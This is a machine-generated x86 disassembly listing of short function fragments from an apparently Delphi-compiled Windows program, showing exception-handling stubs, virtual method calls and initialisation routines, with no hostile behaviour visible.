pop ebp
retn
sub_46bf50
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_46bde8
sub_46bf85
jmp sub_403ae4
sub_46bf8c
pop ebp
retn
sub_46bf90
sub [ rw-data ] 0x1
retn
sub_46c21c
push 0xffffffff
lea ecx [ esp + 0x4 ]
call sub_46c228
retn
sub_46c2cf
jmp sub_403ae4
sub_46c2d6
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_46c32e
jmp sub_403ae4
sub_46c335
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46c33c
test dl dl
je r-xdata
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_46c35c
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0xc ]
retn
sub_46c7da
jmp sub_403ae4
sub_46c7e1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46c8d3
jmp sub_403ae4
sub_46c8da
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_46c968
jmp sub_403ae4
sub_46c96f
mov eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46c99d
jmp sub_403ae4
sub_46c9a4
pop ebp
retn
sub_46c9a8
sub [ rw-data ] 0x1
retn
sub_46cba2
jmp sub_403ae4
sub_46cba9
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_46cc84
jmp sub_403ae4
sub_46cc8b
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46cd1f
jmp sub_403ae4
sub_46cd26
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46cd9c
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46cee0
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46cf93
jmp sub_403ae4
sub_46cf9a
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_46d075
jmp sub_403ae4
sub_46d07c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d268
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46d274
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push eax
push ecx
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ebp
retn 0x4
sub_46d28c
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46d298
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
j_sub_40395c#2
jmp sub_40395c
sub_46d319
add [ eax ] eax
add [ eax ] al
hlt
sub_46d371
jmp sub_403ae4
sub_46d378
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403830#2
jmp sub_403830
sub_46d4a1
jmp sub_403ae4
sub_46d4a8
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d4b4
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46d4c0
push edx
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46d566
jmp sub_403ae4
sub_46d56d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d629
jmp sub_403ae4
sub_46d630
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d64d
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_46d646
jmp sub_403ae4
sub_46d64d
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_46d71b
jmp sub_403ae4
sub_46d722
pop ebx
mov esp ebp
pop ebp
retn
sub_46d72b
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ecx + 0x52 ] dl
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_46d7ce
jmp sub_403ae4
sub_46d7d5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46d86e
jmp sub_403ae4
sub_46d875
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46d8fa
jmp sub_403ae4
sub_46d901
pop ecx
pop ebp
retn
sub_46d904
mov eax [ eax + 0x4 ]
retn
sub_46d962
jmp sub_403ae4
sub_46d969
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_46da45
jmp sub_403ae4
sub_46da4c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46da8d
jmp sub_403ae4
sub_46da94
pop ebp
retn
sub_46da98
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov edx [ sub_46c9b0 ]
mov [ eax ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_46d590
sub_46dae9
jmp sub_403ae4
sub_46daf0
pop ebp
retn
sub_46daf4
sub [ rw-data ] 0x1
retn
sub_46dd1c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40c7d4
pop esi
pop ebx
retn
sub_46dd30
cmp edx eax
jge r-xdata
retn
mov eax edx
sub_46de7b
jmp sub_403ae4
sub_46de82
pop ebx
pop ecx
pop ebp
retn
sub_46df9b
jmp sub_403ae4
sub_46dfa2
fld [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46e074
jmp sub_403ae4
sub_46e07b
fld [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_46e151
jmp sub_403ae4
sub_46e158
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46e2ba
jmp sub_403ae4
sub_46e2c1
mov eax edi
mov edi [ ebp - 0x18 ]
mov esi [ ebp - 0x14 ]
mov ebx [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn 0x4
sub_46e2d4
push ebx
mov ebx eax
call GetCurrentThreadId
cmp eax [ ebx + 0x8 ]
sete al
pop ebx
retn
sub_46e2ec
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
sete al
retn
sub_46e300
call sub_420e98
retn
sub_46e308
call sub_404768
retn
sub_46e4e7
jmp sub_403ae4
sub_46e4ee
pop ebp
retn
sub_46e5c3
jmp sub_403ae4
sub_46e5ca
pop ecx
pop ebp
retn
sub_46e6f8
retn
j_sub_46e6f8
jmp sub_46e6f8
sub_46e700
pop ebp
retn
sub_46e704
sub [ rw-data ] 0x1
retn
sub_46e903
jmp sub_403ae4
sub_46e90a
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_46e9e5
jmp sub_403ae4
sub_46e9ec
pop ebp
retn
sub_46e9f0
sub [ rw-data ] 0x1
retn
sub_46ed7e
jmp sub_403ae4
sub_46ed85
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_46ee0b
jmp sub_403ae4
sub_46ee12
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_403704
sub_46eedb
jmp sub_403ae4
sub_46eee2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46f00c
jmp sub_403ae4
sub_46f013
pop ebp
retn
sub_46f018
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_46ef84
call sub_403e8c
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bd38
mov [ rw-data ] eax
sub_46f044
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_46f6cf
jmp sub_403ae4
sub_46f6d6
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_46f820
jmp sub_403ae4
sub_46f827
pop ebx
mov esp ebp
pop ebp
retn
sub_46fa50
jmp sub_403ae4
sub_46fa6d
jmp sub_403ae4
sub_46fa74
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46fc3d
jmp sub_403ae4
sub_46fc44
mov al [ ebp - 0x1 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46fc50
push ebx
mov ebx eax
mov eax ebx
call sub_419488
mov edx [ r-xdata ]
call sub_403518
mov edx [ ebx + 0x1c ]
mov [ eax + 0x1c ] edx
pop ebx
retn
sub_46fd25
jmp sub_403ae4
sub_46fd2c
pop ebp
retn
sub_46fd30
sub [ rw-data ] 0x1
retn
sub_470120
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_470134
mov edx [ eax + 0x34 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x44 ]
sub_470144
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_470158
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4c ]
sub_470191
jmp sub_403ae4
sub_470198
pop ebp
retn
sub_47019c
sub [ rw-data ] 0x1
retn
sub_470288
retn
sub_47028c
push ebp
mov ebp esp
pop ebp
retn 0x14
sub_4702c0
retn
sub_4702c4
retn
sub_4702ed
jmp sub_403ae4
sub_4702f4
pop ebp
retn
sub_4702f8
sub [ rw-data ] 0x1
retn
sub_47051c
push ebx
mov ebx eax
xor eax eax
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
lea eax [ ebx + 0x14 ]
call sub_404164
pop ebx
retn
sub_4706f9
jmp sub_403ae4
sub_470700
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_470827
jmp sub_403ae4
sub_47082e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4708a3
jmp sub_403ae4
sub_4708aa
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4708c4
push esi
mov esi eax
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_470900
push ebx
mov ebx eax
mov eax ebx
call sub_419488
pop ebx
retn
sub_4709c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419630
pop esi
pop ebx
retn
sub_470a2d
jmp sub_403ae4
sub_470a34
pop ebp
retn
sub_470a38
sub [ rw-data ] 0x1
retn
sub_470a65
jmp sub_403ae4
sub_470a6c
pop ebp
retn
sub_470a70
sub [ rw-data ] 0x1
retn
sub_470f79
jmp sub_403ae4
sub_470f80
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47103f
jmp sub_40395c
sub_471044
add [ eax ] eax
add [ eax ] al
int3
j_sub_40395c#5
jmp sub_40395c
sub_471194
add [ eax ] eax
add [ eax ] al
int3
sub_4712cb
jmp sub_403830
sub_47154d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_471572
lea eax [ ebp - 0x14c ]
mov edx 0xf
call sub_404188
retn
sub_47156b
jmp sub_403ae4
sub_471572
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4715bd
jmp sub_403ae4
sub_4715c4
pop ebp
retn
sub_4715c8
sub [ rw-data ] 0x1
retn
sub_4715f5
jmp sub_403ae4
sub_4715fc
pop ebp
retn
sub_471600
sub [ rw-data ] 0x1
retn
sub_47162d
jmp sub_403ae4
sub_471634
pop ebp
retn
sub_471638
sub [ rw-data ] 0x1
retn
sub_471959
jmp sub_403ae4
sub_471960
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47197d
lea eax [ ebp - 0x8 ]
call sub_404164
retn
sub_471976
jmp sub_403ae4
sub_47197d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_471b55
jmp sub_403ae4
sub_471b5c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
sub_471b68
mov ecx [ eax + 0x68 ]
test ecx ecx
setne dl
test dl dl
je r-xdata
mov eax edx
retn
mov dl [ ecx + 0x10 ]
sub_471be8
mov eax [ eax + 0x68 ]
call sub_46f93c
retn
sub_471c64
jmp sub_403ae4
sub_471c6b
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_471ce4
jmp sub_403ae4
sub_471ceb
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_40395c#3
jmp sub_40395c
sub_471e4a
add [ eax ] eax
add [ eax ] al
int3
sub_471ea1
jmp sub_403ae4
sub_471ea8
pop ebp
retn
sub_471eac
sub [ rw-data ] 0x1
retn
sub_472500
jmp sub_403ae4
sub_472507
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_472524
lea eax [ ebp - 0x8 ]
call sub_404164
retn
sub_47251d
jmp sub_403ae4
sub_472524
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4725f0
jmp sub_403ae4
sub_4725f7
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4727a8
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_472841
jmp sub_403ae4
sub_472848
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4728a6
jmp sub_403ae4
sub_4728ad
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_472b4c
jmp sub_403ae4
sub_472b53
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_472d7e
jmp sub_403ae4
sub_472d85
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_472e12
jmp sub_403ae4
sub_472e19
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_472e98
mov ecx edx
mov [ eax + 0x78 ] ecx
test ecx ecx
je r-xdata
retn
mov edx eax
mov eax ecx
call sub_421254
sub_4730a9
jmp sub_403ae4
sub_473128
jmp sub_403ae4
sub_47312f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4731fd
jmp sub_403ae4
sub_47325a
jmp sub_403ae4
sub_473261
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4732e8
jmp sub_403ae4
sub_4732ef
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47343a
jmp sub_403ae4
sub_473441
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473460
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
retn
sub_473459
jmp sub_403ae4
sub_473460
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47347d
lea eax [ ebp - 0x14 ]
call sub_404164
retn
sub_473476
jmp sub_403ae4
sub_47347d
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_473540
mov eax [ eax + 0xb0 ]
call sub_41b428
retn
sub_47354c
push ebx
push 0x0
mov ecx 0x1
mov ebx [ eax ]
call [ ebx + 0x6c ]
pop ebx
retn
sub_47362a
jmp sub_403ae4
sub_473631
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47370d
jmp sub_403ae4
sub_473714
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_473866
jmp sub_403ae4
sub_47386d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473897
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_404188
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_473890
jmp sub_403ae4
sub_473897
pop ebx
mov esp ebp
pop ebp
retn
sub_4738f6
jmp sub_403ae4
sub_4738fd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4739aa
jmp sub_403ae4
sub_4739b1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4739c7
inc [ edx ]
add [ eax ] al
add [ esi ] ch
add [ cs : eax ] al
push ebx
xor edx edx
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_4739dc
push ebx
mov ebx eax
mov eax ebx
call sub_41b428
xor eax eax
mov [ ebx + 0x24 ] eax
pop ebx
retn
sub_473ac4
jmp sub_403ae4
sub_473acb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_473ad4
mov edx [ eax + 0x4 ]
add edx [ eax + 0x24 ]
mov eax edx
retn
sub_473bcc
jmp sub_403ae4
sub_473bd3
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_473c35
jmp sub_403ae4
sub_473c3c
pop ebp
retn
sub_473c40
sub [ rw-data ] 0x1
retn
sub_473ed6
jmp sub_403ae4
sub_473edd
pop ebx
pop ecx
pop ebp
retn
sub_473ee4
retn
sub_473ee8
retn
sub_473eec
retn
sub_473ef0
retn
sub_473fbb
jmp sub_403ae4
sub_473fc2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_473fd8
jmp sub_403ae4
sub_474002
jmp sub_403ae4
sub_474009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_474013
jmp sub_40395c
sub_474018
add [ eax ] eax
add [ eax ] al
int3
sub_4740b9
jmp sub_403830
sub_474186
jmp sub_403ae4
sub_47418d
pop ecx
pop ebp
retn
sub_4741ee
jmp sub_403ae4
sub_4741f5
pop ecx
pop ebp
retn
sub_47425b
jmp sub_403ae4
sub_474270
push ebx
cmp [ eax + 0x62 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
sub_474284
push ebx
cmp [ eax + 0x5a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_47429c
mov [ eax + 0x49 ] 0x1
call sub_4210d8
retn
sub_4742a8
add eax 0x40
call sub_40d490
retn
sub_4742b4
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_421004
pop ebp
retn 0x8
sub_4742ed
jmp sub_403ae4
sub_4742f4
pop ebp
retn
sub_4742f8
sub [ rw-data ] 0x1
retn
sub_474459
jmp sub_403ae4
sub_474460
pop ebp
retn
sub_474464
sub [ rw-data ] 0x1
retn
sub_474575
jmp sub_403ae4
sub_47457c
pop ebp
retn
sub_474580
sub [ rw-data ] 0x1
retn
sub_474745
jmp sub_403ae4
sub_47474c
pop ebp
retn
sub_474750
sub [ rw-data ] 0x1
retn
sub_47482c
jmp sub_403ae4
sub_474833
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47496d
jmp sub_403ae4
sub_474974
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4749a1
jmp sub_403ae4
sub_4749a8
pop ebp
retn
sub_4749ac
sub [ rw-data ] 0x1
retn
sub_4749f9
jmp sub_403ae4
sub_474a31
jmp sub_403ae4
sub_474a38
pop ebp
retn
sub_474a3c
sub [ rw-data ] 0x1
retn
sub_474c8b
jmp sub_403ae4
sub_474c92
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_474ccc
retn
sub_474cf5
jmp sub_403ae4
sub_474cfc
pop ebp
retn
sub_474d00
sub [ rw-data ] 0x1
retn
sub_475d88
push ebx
cmp [ eax + 0xb2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_475da8
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
retn
push edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_475e04
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_475e20
push ebx
cmp [ eax + 0xd2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
sub_475f52
jmp sub_403ae4
sub_475f96
jmp sub_403ae4
sub_475f9d
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_475fb4
push ebx
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_47605c
jmp sub_403ae4
sub_476063
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_476068
mov eax [ eax + 0x70 ]
mov eax [ eax + 0x1c ]
retn
sub_4762e2
jmp sub_403ae4
sub_4762fc
push esi
mov esi eax
mov eax [ esi + 0x70 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_47630c
mov eax [ eax + 0x70 ]
mov [ eax + 0x1c ] edx
retn
sub_476314
mov ecx edx
mov [ eax + 0x84 ] ecx
test ecx ecx
je r-xdata
retn
mov edx eax
mov eax ecx
call sub_421254
sub_47642c
jmp sub_403ae4
sub_4764d0
jmp sub_403ae4
sub_476558
jmp sub_403ae4
sub_47655f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47659c
retn
sub_4765a0
push ebx
mov ebx eax
mov eax ebx
call sub_473ee8
mov dl 0x1
mov eax [ ebx + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
pop ebx
retn
j_sub_40395c#4
jmp sub_40395c
sub_47673d
add [ eax ] eax
add [ eax ] al
int3
sub_476805
jmp sub_403830
sub_476874
mov edx [ eax + 0x68 ]
mov edx [ edx + 0xb8 ]
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x40 ]
retn
j_sub_40395c#6
jmp sub_40395c
j_sub_40395c
jmp sub_40395c
sub_476a07
add [ eax ] eax
add [ eax ] al
int3
sub_476a4a
jmp sub_403ae4
sub_476a51
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_476aa8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419630
pop esi
pop ebx
retn
sub_476abc
push esi
mov si 0xffff
call sub_403564
pop esi
retn
j_sub_40395c#8
jmp sub_40395c
sub_476cbd
add [ eax ] eax
add [ eax ] al
int3
sub_476dbb
jmp sub_403ae4
sub_476de5
jmp sub_403ae4
sub_476dec
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_476ebf
jmp sub_403ae4
sub_476ec6
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_476f1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x1c ]
call sub_4041b8
pop esi
pop ebx
retn
sub_476fad
jmp sub_403ae4
sub_476fb4
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_476fe4
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_477098
push ebx
mov edx [ eax + 0x4 ]
cmp [ edx + 0x22 ] 0x0
je r-xdata
pop ebx
retn
mov ebx edx
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_477105
jmp sub_403ae4
sub_47710c
pop ebp
retn
sub_477110
sub [ rw-data ] 0x1
retn
sub_477c79
jmp sub_403ae4
sub_477c80
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477e0b
jmp sub_403ae4
sub_477e12
fld [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477fc3
jmp sub_403ae4
sub_477fca
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477feb
[ ecx ]
sub_47815e
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404188
retn
sub_47816c
jmp sub_403ae4
j_sub_47815e
jmp sub_47815e
sub_478173
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47832b
jmp sub_403ae4
sub_478332
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478353
jmp [ ecx ]
sub_4783da
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_4783e3
jmp sub_403ae4
j_sub_4783da
jmp sub_4783da
sub_4783ea
pop ebx
mov esp ebp
pop ebp
retn
sub_4784d2
lea eax [ ebp - 0x18 ]
call sub_404164
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_4784e3
jmp sub_403ae4
j_sub_4784d2
jmp sub_4784d2
sub_4784ea
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47869f
jmp sub_403ae4
sub_4786a6
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4786c7
jmp [ ecx ]
sub_4787f1
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404188
lea eax [ ebp - 0x4 ]
call sub_404164
retn
sub_478807
jmp sub_403ae4
j_sub_4787f1
jmp sub_4787f1
sub_47880e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478827
jmp [ eax ]
sub_478911
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_404188
retn
sub_47891f
jmp sub_403ae4
j_sub_478911
jmp sub_478911
sub_478926
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47893f
[ eax + eax ]
sub_478ab6
jmp sub_403ae4
sub_478abd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478af3
add [ ebx - 0x7f39e3be ] cl
add [ eax ] 0x8b010000
inc edx
adc al 0xba
enter 0x0 0x0
call sub_470858
retn
sub_478c5b
jmp sub_403ae4
sub_478c62
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478dea
jmp sub_403ae4
sub_478df1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478ece
jmp sub_403ae4
sub_478ed5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_478eeb
[ eax + eax ]
sub_478ffd
lea eax [ ebp - 0x8 ]
call sub_404164
retn
sub_479006
jmp sub_403ae4
j_sub_478ffd
jmp sub_478ffd
sub_47900d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_479014
mov eax [ edx + 0x1c ]
mov [ eax + 0x81 ] 0x0
mov eax [ edx + 0x14 ]
mov edx 0xdc
call sub_470858
retn
sub_4791b4
jmp sub_403ae4
sub_4791bb
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4791df
jmp [ eax + eax ]
sub_4793c2
lea eax [ ebp - 0x2c ]
mov edx 0x6
call sub_404188
lea eax [ ebp - 0x10 ]
call sub_404164
retn
sub_4793d8
jmp sub_403ae4
j_sub_4793c2
jmp sub_4793c2
sub_4793df
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47954e
jmp sub_403ae4
sub_479555
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_479695
jmp sub_403ae4
sub_479774
push ebx
cmp [ eax + 0x14a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_479feb
jmp [ ecx ]
sub_47a1c7
jmp [ eax + eax ]
sub_47a21f
jmp [ ecx ]
sub_47a24b
jmp [ eax + eax ]
sub_47a29b
jmp [ ebx ]
sub_47a2c7
jmp [ ecx ]
sub_47a2f3
jmp [ eax + eax ]
sub_47a357
jmp [ edi ]
sub_47a3e7
jmp [ edi ]
sub_47a442
add [ eax ] al
sub_47a4c4
push esi
mov esi eax
mov eax [ esi + 0xf8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_47a510
push esi
mov esi eax
mov eax [ esi + 0xfc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_47a55c
jmp sub_403ae4
sub_47a563
pop ebp
retn
sub_47a568
sub [ rw-data ] 0x1
retn
sub_47a6d4
add eax 0x68
call sub_40d490
retn
sub_47a754
cmp [ eax + 0x70 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x68 ]
test edx edx
je r-xdata
xor eax eax
retn
cmp [ edx + 0x10 ] 0x0
jne r-xdata
sub_47a7b4
push ebx
mov ebx eax
mov eax ebx
call sub_4215d4
mov al [ ebx + 0x70 ]
mov [ ebx + 0x70 ] 0x0
mov edx eax
mov eax ebx
call sub_47a7d0
pop ebx
retn
sub_47a88d
jmp sub_403ae4
sub_47a894
pop ebp
retn
sub_47a898
sub [ rw-data ] 0x1
retn
sub_47ac44
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_47ad48
mov eax [ eax + 0x88 ]
mov eax [ eax + 0x1c ]
retn
